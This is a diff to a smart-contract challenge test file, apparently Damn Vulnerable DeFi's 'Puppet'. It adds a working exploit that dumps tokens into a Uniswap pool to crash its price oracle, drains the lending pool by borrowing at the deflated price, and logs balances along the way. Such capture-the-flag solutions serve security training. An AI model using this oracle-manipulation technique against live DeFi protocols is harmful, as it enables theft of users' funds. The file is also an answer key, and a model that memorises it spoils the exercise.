@@ -103,6 +103,53 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        getRequireAmount = async (amount) => {
+            let requiredAmount = await this.lendingPool.calculateDepositRequired(amount);
+            console.log(`required amount: ${ethers.utils.formatEther(requiredAmount)} ETH`);
+            return requiredAmount;
+        }
+        checkBalance = async () => {
+            console.log(`--------`);
+            console.log(`DVT.balance[attacker]: ${ethers.utils.formatEther(await this.token.balanceOf(attacker.address))} DVT`);
+            console.log(`DVT.balance[uniswap] : ${ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address))} DVT`);
+            console.log(`DVT.balance[pool]    : ${ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address))} DVT`);
+            console.log(`ETH.balance[attacker]: ${ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))} ETH`);
+            console.log(`ETH.balance[uniswap] : ${ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address))} ETH`);
+            console.log(`ETH.balance[pool]    : ${ethers.utils.formatEther(await ethers.provider.getBalance(this.lendingPool.address))} ETH`);
+            console.log(`--------`);
+        }
+        
+        await checkBalance();
+        console.log(`swapping DVT to ETH...`);
+        let deadline = parseInt((await ethers.provider.getBlock('latest')).timestamp) + 1000;
+        let token2sold = await this.token.balanceOf(attacker.address);
+        let min_eth = 1; // should > 0
+        console.log(`deadline : ${deadline}`);
+        console.log(`tokenSold: ${ethers.utils.formatEther(token2sold)} DVT`);
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, token2sold);
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            token2sold, 
+            min_eth, 
+            deadline
+        );
+        
+        await checkBalance();
+        console.log(`borrowing...`);
+        let amount2borrow = await this.token.balanceOf(this.lendingPool.address);
+        let amount = await getRequireAmount(amount2borrow);
+        await this.lendingPool.connect(attacker).borrow(amount2borrow, {value:amount});
+        
+        await checkBalance();
+        console.log(`swapping ETH to DVT...`);
+        deadline = parseInt((await ethers.provider.getBlock('latest')).timestamp) + 1000;
+        let needed_dvt = ethers.utils.parseEther("10");
+        let eth2sold = ethers.utils.parseEther("1");
+        await this.uniswapExchange.connect(attacker).ethToTokenSwapOutput(
+            needed_dvt, 
+            deadline, 
+            {value:eth2sold}
+        );
+        await checkBalance();
     });
 
     after(async function () {
